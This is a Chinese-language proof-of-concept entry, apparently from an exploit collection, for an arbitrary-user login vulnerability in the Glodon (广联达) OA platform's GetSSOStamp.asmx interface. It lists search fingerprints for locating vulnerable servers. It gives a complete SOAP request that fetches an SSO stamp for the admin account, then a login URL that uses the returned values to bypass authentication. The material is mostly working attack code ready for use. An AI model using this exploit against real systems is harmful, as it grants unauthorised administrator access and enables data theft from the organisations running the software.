﻿# 广联达OA GetSSOStamp.asmx 任意用户登录漏洞

> 更新时间：2024-03-29

> 漏洞编号：

> 漏洞说明：广联达OA协同办公管理平台 GetSSOStamp.asmx接口处存在任意用户登录漏洞，恶意攻击者可能利用该漏洞登录到系统内部，可能会造成信息泄露或者服务器失陷等危害。

> 漏洞特征：body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx" || fid="/yV4r5PdARKT4jaqLjJYqw=="

> 验证脚本：HTTP

```
POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetStamp"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <soap:Body>
   <GetStamp xmlns="http://tempuri.org/">
    <usercode>admin</usercode>
   </GetStamp>
 </soap:Body>
</soap:Envelope>
```

> 响应代码特征：200

> 响应内容特征：GetStamp

> 上传文件定位：

> 验证文件来源：广联达OA GetSSOStamp.asmx 任意用户登录漏洞.poc

```
发送数据包，获取登录所需要的LoginCredenc和LoginTimestamp值,使用获取到的值绕过登录,注意更换service中的IP地址
http://127.0.0.1/Services/Identification/Server/login.ashx?sso=1&ssoProvider=WorkflowSSO&LoginFlag=custom&UserCode=admin&LoginCredence=C9021CDFB7A008CBD149181FE2CF8861&LoginTimestamp=764783439&service=http://127.0.0.1/Portal/frame/layoutA/Default.aspx
```